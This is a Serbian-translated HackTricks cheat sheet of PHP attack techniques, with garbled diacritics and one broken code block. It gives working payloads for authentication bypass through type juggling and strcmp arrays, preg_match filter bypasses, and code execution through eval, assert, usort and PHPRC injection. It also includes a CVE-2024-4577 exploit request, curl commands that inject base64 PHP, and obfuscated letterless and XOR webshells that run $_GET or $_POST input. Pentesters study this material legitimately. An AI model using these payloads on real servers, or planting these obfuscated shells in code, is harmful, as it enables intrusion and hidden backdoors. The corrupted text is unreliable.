# PHP Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Uobi캜ajena lokacija kola캜i캖a:

Ovo va쬴 i za phpMyAdmin kola캜i캖e.

Kola캜i캖i:
```
PHPSESSID
phpMyAdmin
```
Lokacije:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassing PHP comparisons

### Loose comparisons/Type Juggling ( == )

Ako se `==` koristi u PHP-u, postoje neo캜ekivani slu캜ajevi gde upore캠ivanje ne funkcioni코e kako se o캜ekuje. To je zato 코to "==" upore캠uje samo vrednosti transformisane u isti tip, ako tako캠e 쬰lite da uporedite da li je tip upore캠ivanih podataka isti, morate koristiti `===`.

PHP tabele upore캠ivanja: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` String koji ne po캜inje brojem je jednak broju
* `"0xAAAA" == "43690" -> True` Stringovi sastavljeni od brojeva u dec ili hex formatu mogu se uporediti sa drugim brojevima/stringovima sa True kao rezultatom ako su brojevi isti (brojevi u stringu se tuma캜e kao brojevi)
* `"0e3264578" == 0 --> True` String koji po캜inje sa "0e" i nakon toga sledi bilo 코ta bi캖e jednak 0
* `"0X3264578" == 0X --> True` String koji po캜inje sa "0" i nakon toga sledi bilo koje slovo (X mo쬰 biti bilo koje slovo) i nakon toga bilo 코ta bi캖e jednak 0
* `"0e12334" == "0" --> True` Ovo je veoma zanimljivo jer u nekim slu캜ajevima mo쬰te kontrolisati string unos "0" i neki sadr쬬j koji se he코ira i upore캠uje sa njim. Stoga, ako mo쬰te pru쬴ti vrednost koja 캖e stvoriti he코 koji po캜inje sa "0e" i bez ikakvog slova, mogli biste zaobi캖i upore캠ivanje. Mo쬰te prona캖i **ve캖 he코irane stringove** sa ovim formatom ovde: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Svako slovo u stringu je jednako int 0

Vi코e informacija na [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** tako캠e uti캜e na funkciju `in_array()` po defaultu (morate postaviti tre캖i argument na true da biste napravili strogo upore캠ivanje):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Ako se ova funkcija koristi za **bilo koju proveru autentifikacije** (kao 코to je provera lozinke) i korisnik kontroli코e jednu stranu pore캠enja, mo쬰 poslati prazan niz umesto stringa kao vrednost lozinke (`https://example.com/login.php/?username=admin&password[]=`) i zaobi캖i ovu proveru:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ista gre코ka se javlja sa `strcasecmp()`

### Strogo prebacivanje tipova

캛ak i ako se koristi `===`, mogu se javiti gre코ke koje 캜ine da je **upore캠ivanje ranjivo** na **prebacivanje tipova**. Na primer, ako upore캠ivanje **pretvara podatke u drugi tip objekta pre nego 코to ih uporedi**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** mo쬰 se koristiti za **validaciju korisni캜kog unosa** (on **proverava** da li je neka **re캜/regex** iz **crne liste** **prisutna** u **korisni캜kom unosu** i ako nije, kod mo쬰 nastaviti sa izvr코avanjem).

#### Bypass novog reda

Me캠utim, kada se odre캠uje po캜etak regexp-a, `preg_match()` **proverava samo prvu liniju korisni캜kog unosa**, a zatim, ako nekako mo쬰te **poslati** unos u **vi코e linija**, mogli biste biti u mogu캖nosti da zaobi캠ete ovu proveru. Primer:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Da biste zaobi코li ovu proveru, mo쬰te **poslati vrednost sa novim redovima urlkodiranim** (`%0A`) ili ako mo쬰te poslati **JSON podatke**, po코aljite ih u **several lines**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Na캠ite primer ovde: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Obila쬰nje gre코ke u du쬴ni**

(Ovo obila쬰nje je o캜igledno isprobano na PHP 5.2.5 i nisam mogao da ga nateram da radi na PHP 7.3.15)\
Ako mo쬰te da po코aljete `preg_match()` va쬰캖i veoma **veliki unos**, **ne캖e mo캖i da ga obradi** i mo캖i 캖ete da **obidjete** proveru. Na primer, ako se crna lista JSON, mogli biste poslati:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trik iz: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) i [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Ukratko, problem se de코ava jer `preg_*` funkcije u PHP-u koriste [PCRE biblioteku](http://www.pcre.org/). U PCRE odre캠ene regularne izraze se podudara koriste캖i mnogo rekurzivnih poziva, 코to tro코i mnogo prostora na steku. Mogu캖e je postaviti limit na broj dozvoljenih rekurzija, ali u PHP-u ovaj limit [podrazumevano iznosi 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) 코to je vi코e nego 코to stane na stek.

[Ova Stackoverflow tema](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) je tako캠e povezana u postu gde se o ovom problemu govori detaljnije. Na코 zadatak je sada bio jasan:\
**Po코aljite unos koji bi naterao regex da izvr코i 100\_000+ rekurzija, uzrokuju캖i SIGSEGV, 캜ine캖i da `preg_match()` funkcija vrati `false`, 캜ime aplikacija misli da na코 unos nije zlonameran, izbacuju캖i iznena캠enje na kraju payload-a ne코to poput `{system(<verybadcommand>)}` da bi dobili SSTI --> RCE --> flag :)**.

Pa, u terminima regex-a, zapravo ne radimo 100k "rekurzija", ve캖 umesto toga brojimo "korake unazad", 코to, kao 코to [PHP dokumentacija](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) navodi, podrazumevano iznosi 1\_000\_000 (1M) u `pcre.backtrack_limit` varijabli.\
Da bismo to postigli, `'X'*500_001` 캖e rezultirati u 1 milion koraka unazad (500k unapred i 500k unazad):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Tip prebacivanja tipova za PHP obfuscation
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Ako PHP preusmerava na drugu stranicu, ali nijedna **`die`** ili **`exit`** funkcija nije **pozvana nakon 코to je postavljen header `Location`**, PHP nastavlja sa izvr코avanjem i dodaje podatke u telo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Put Traversal i Eksploatacija Uklju캜ivanja Datoteka

Proverite:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Vi코e trikova

* **register\_globals**: U **PHP < 4.1.1.1** ili ako je pogre코no konfigurisano, **register\_globals** mo쬰 biti aktivan (ili se njihovo pona코anje imitira). To implicira da u globalnim promenljivim kao 코to su $\_GET, ako imaju vrednost npr. $\_GET\["param"]="1234", mo쬰te mu pristupiti preko **$param. Stoga, slanjem HTTP parametara mo쬰te prepisati promenljive** koje se koriste unutar koda.
* **PHPSESSION kola캜i캖i iste domene se 캜uvaju na istom mestu**, stoga ako unutar domene **razli캜iti kola캜i캖i se koriste na razli캜itim putanjama** mo쬰te u캜initi da putanja **pristupi kola캜i캖u druge putanje** postavljanjem vrednosti kola캜i캖a druge putanje.\
Na ovaj na캜in, ako **obe putanje pristupaju promenljivoj sa istim imenom** mo쬰te u캜initi da **vrednost te promenljive u putanji1 va쬴 za putanju2**. I tada 캖e putanja2 smatrati validnim promenljive putanje1 (daju캖i kola캜i캖u ime koje odgovara njemu u putanji2).
* Kada imate **korisni캜ka imena** korisnika ma코ine. Proverite adresu: **/\~\<USERNAME>** da vidite da li su php direktorijumi aktivirani.
* [**LFI i RCE koriste캖i php omota캜e**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Ove funkcije se obi캜no koriste u PHP-u da **generi코u he코ove iz lozinki** i da **provere** da li je lozinka ta캜na u pore캠enju sa he코om.\
Podr쬬ni algoritmi su: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (po캜inje sa `$2y$`). Imajte na umu da je **PASSWORD\_DEFAULT 캜esto isto 코to i PASSWORD\_BCRYPT.** A trenutno, **PASSWORD\_BCRYPT** ima **ograni캜enje veli캜ine ulaza od 72bajta**. Stoga, kada poku코ate da he코irate ne코to ve캖e od 72bajta sa ovim algoritmom, koristi캖e se samo prvih 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### Uzrokovanje gre코ke nakon postavljanja zaglavlja

Iz [**ove twitter niti**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) mo쬰te videti da slanje vi코e od 1000 GET parametara ili 1000 POST parametara ili 20 fajlova, PHP ne캖e postaviti zaglavlja u odgovoru.

Omogu캖ava zaobila쬰nje, na primer, CSP zaglavlja koja se postavljaju u kodovima kao:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Popunjavanje tela pre postavljanja zaglavlja

Ako **PHP stranica ispisuje gre코ke i vra캖a neki unos koji je korisnik pru쬴o**, korisnik mo쬰 naterati PHP server da vrati neki **sadr쬬j dovoljno dug** tako da kada poku코a da **doda zaglavlja** u odgovor, server 캖e baciti gre코ku.\
U slede캖em scenariju **napada캜 je naterao server da baci neke velike gre코ke**, i kao 코to mo쬰te videti na ekranu kada je PHP poku코ao da **izmeni informacije o zaglavlju, nije mogao** (tako da, na primer, CSP zaglavlje nije poslato korisniku):

![](<../../../.gitbook/assets/image (1085).png>)

## SSRF u PHP funkcijama

Proverite stranicu:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Izvr코avanje koda

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Proverite ovo za vi코e korisnih PHP funkcija](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **RCE putem** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Da bi se izvr코io kod u "replace" argumentu, potrebna je najmanje jedna podudarnost.\
Ova opcija preg\_replace je **ukinuta od PHP 5.5.0.**

### **RCE putem Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE putem Assert()**

Ova funkcija unutar php omogu캖ava vam da **izvr코ite kod koji je napisan u stringu** kako biste **vratili true ili false** (i u zavisnosti od toga promenili izvr코enje). Obi캜no 캖e korisni캜ka promenljiva biti umetnuta u sredinu stringa. Na primer:\
`assert("strpos($_GET['page']),'..') === false")` --> U ovom slu캜aju da biste dobili **RCE** mogli biste uraditi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Bi캖e potrebno da **razbijete** **sintaksu** koda, **dodate** svoj **payload**, a zatim **ponovo to ispravite**. Mo쬰te koristiti **logi캜ke operacije** kao 코to su "**and" ili "%26%26" ili "|"**. Imajte na umu da "or", "||" ne funkcioni코e jer ako je prvi uslov ta캜an, na코 payload se ne캖e izvr코iti. Na isti na캜in ";" ne funkcioni코e jer se na코 payload ne캖e izvr코iti.

**Druga opcija** je da dodate izvr코enje komande u string: `'.highlight_file('.passwd').'`

**Druga opcija** (ako imate interni kod) je da modifikujete neku promenljivu da biste promenili izvr코enje: `$file = "hola"`

### **RCE putem usort()**

Ova funkcija se koristi za sortiranje niza stavki koriste캖i specifi캜nu funkciju.\
Da biste zloupotrebili ovu funkciju:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Mo쬰te tako캠e koristiti **//** da komentari코ete ostatak koda.

Da biste otkrili broj zagrada koje treba da zatvorite:

* `?order=id;}//`: dobijamo poruku o gre코ci (`Parse error: syntax error, unexpected ';'`). Verovatno nam nedostaje jedna ili vi코e zagrada.
* `?order=id);}//`: dobijamo **upozorenje**. To izgleda u redu.
* `?order=id));}//`: dobijamo poruku o gre코ci (`Parse error: syntax error, unexpected ')' i`). Verovatno imamo previ코e zatvorenih zagrada.

### **RCE putem .httaccess**

Ako mo쬰te da **otpremite** **.htaccess**, onda mo쬰te **konfigurisati** nekoliko stvari i 캜ak izvr코iti kod (konfiguri코u캖i da se datoteke sa ekstenzijom .htaccess mogu **izvr코iti**).

Razli캜iti .htaccess shell-ovi mogu se na캖i [ovde](https://github.com/wireghoul/htshells)

### RCE putem Env Varijabli

Ako prona캠ete ranjivost koja vam omogu캖ava da **modifikujete env varijable u PHP-u** (i jo코 jednu za otpremanje datoteka, iako se mo쬯a ovo mo쬰 zaobi캖i uz vi코e istra쬴vanja), mogli biste zloupotrebiti ovo pona코anje da dobijete **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ova env varijabla vam omogu캖ava da u캜itate proizvoljne biblioteke prilikom izvr코avanja drugih binarnih datoteka (iako u ovom slu캜aju mo쬯a ne캖e raditi).
* **`PHPRC`** : Upravlja PHP-om o **tome gde da locira svoj konfiguracioni fajl**, obi캜no nazvan `php.ini`. Ako mo쬰te da otpremite svoj konfiguracioni fajl, onda, koristite `PHPRC` da usmerite PHP ka njemu. Dodajte **`auto_prepend_file`** unos koji specificira drugu otpremanu datoteku. Ova druga datoteka sadr쬴 normalan **PHP kod, koji se zatim izvr코ava** od strane PHP runtime-a pre bilo kog drugog koda.
1. Otpremite PHP datoteku koja sadr쬴 na코 shellcode
2. Otpremite drugu datoteku, koja sadr쬴 **`auto_prepend_file`** direktivu koja upu캖uje PHP preprocesor da izvr코i datoteku koju smo otpremili u koraku 1
3. Postavite `PHPRC` varijablu na datoteku koju smo otpremili u koraku 2.
* Dobijte vi코e informacija o tome kako izvr코iti ovaj lanac [**iz originalnog izve코taja**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - druga opcija
* Ako **ne mo쬰te otpremiti datoteke**, mo쬰te koristiti u FreeBSD "datoteku" `/dev/fd/0` koja sadr쬴 **`stdin`**, 코to je **telo** zahteva poslatog na `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ili da dobijete RCE, omogu캖ite **`allow_url_include`** i dodajte datoteku sa **base64 PHP kodom**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Tehnika [**iz ovog izve코taja**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Web server analizira HTTP zahteve i prosle캠uje ih PHP skripti koja izvr코ava zahtev kao [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) kao `php.exe cgi.php foo=bar`, 코to omogu캖ava injekciju parametara. Ovo bi omogu캖ilo injekciju slede캖ih parametara za u캜itavanje PHP koda iz tela:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Pored toga, mogu캖e je injektovati parametar "-" koriste캖i karakter 0xAD zbog kasnije normalizacije PHP-a. Proverite primer eksploatacije iz [**ove objave**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**U ovom postu**](https://blog.redteam-pentesting.de/2024/moodle-rce/) mogu캖e je prona캖i sjajne ideje za generisanje brain fuck PHP koda sa vrlo malo dozvoljenih karaktera.\
Pored toga, predlo쬰na je i zanimljiva metoda za izvr코avanje funkcija koja im je omogu캖ila da zaobi캠u nekoliko provera:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Staticka analiza

Pogledajte da li mo쬰te da umetnete kod u pozive ovih funkcija (iz [ovde](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Ako debagujete PHP aplikaciju, mo쬰te globalno omogu캖iti 코tampanje gre코aka u `/etc/php5/apache2/php.ini` dodavanjem `display_errors = On` i restartovanjem apache-a: `sudo systemctl restart apache2`

### Deobfuscating PHP code

Mo쬰te koristiti **web**[ **www.unphp.net**](http://www.unphp.net) **za deobfuskaciju php koda.**

## PHP Wrappers & Protocols

PHP Wrappers i protokoli mogu vam omogu캖iti da **zaobi캠ete za코tite za pisanje i 캜itanje** u sistemu i kompromitujete ga. Za [**vi코e informacija proverite ovu stranicu**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

Ako vidite da je **Xdebug** **omogu캖en** u `phpconfig()` izlazu, trebali biste poku코ati da dobijete RCE putem [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE zloupotreba novog $\_GET\["a"]\($\_GET\["b")

Ako na stranici mo쬰te **napraviti novi objekat proizvoljne klase** mo쬯a 캖ete mo캖i da dobijete RCE, proverite slede캖u stranicu da biste saznali kako:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Izvr코avanje PHP bez slova

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Kori코캖enje oktalnog
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If 춱___ not needed then $_($__), show_source(.passwd)
```
### XOR easy shell code

Prema [**ovoj analizi** ](https://mgp25.com/ctf/Web-challenge/) mogu캖e je generisati jednostavan shellcode na ovaj na캜in:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Dakle, ako mo쬰te **izvr코iti proizvoljni PHP bez brojeva i slova** mo쬰te poslati zahtev poput slede캖eg koriste캖i tu payload da izvr코ite proizvoljni PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Za detaljnije obja코njenje pogledajte [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (unutar eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl like
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
